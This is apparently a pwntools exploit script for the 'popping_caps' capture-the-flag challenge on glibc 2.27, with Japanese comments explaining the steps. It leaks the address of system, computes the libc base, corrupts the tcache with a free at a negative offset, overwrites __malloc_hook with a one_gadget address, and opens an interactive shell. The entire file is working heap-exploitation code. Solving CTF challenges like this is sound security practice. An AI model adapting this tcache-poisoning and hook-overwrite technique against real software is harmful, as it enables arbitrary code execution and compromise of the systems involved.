#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./popping_caps_patched")
elf = ELF("popping_caps_patched")
libc = ELF("libc-2.27.so")
gdb.attach(target, gdbscript="b free")

def malloc(buf):
    target.recvuntil("Your choice:")
    target.sendline("1")
    target.recvuntil("How many:")
    target.sendline(str(buf))

def free(size):
    target.recvuntil("Your choice:")
    target.sendline("2")
    target.recvuntil("Whats in a free:")
    target.sendline(str(size))

def write(content):
    target.recvuntil("Your choice:")
    target.sendline("3")
    print(target.recvuntil("Read me in:"))
    target.send(content)

system = int(str(target.recvline()[15:-1])[2:-1], 16)
glibc = system - libc.symbols["system"]
hook = glibc + libc.symbols["__malloc_hook"]
print("[*]system is ", hex(system))
print("[*]libc base is ", hex(glibc))
print("[*]malloc_hook is", hex(hook))

"""
tcacheのチャンクアドレスを確保している位置に書き込みたいので
ちょうどサイズが0x100になり,かつアドレスの上部分にあるサイズで確保する
"""
malloc(0x3a0)
free(0)
free(-0x210)
malloc(0xf0)

#最小サイズの位置にhookを書き込むと,次に最小サイズでmallocしたときhookに割り当てられる
write(p64(hook))
malloc(0x10)

shot = glibc + 0x10a38c
write(p64(shot))

target.interactive()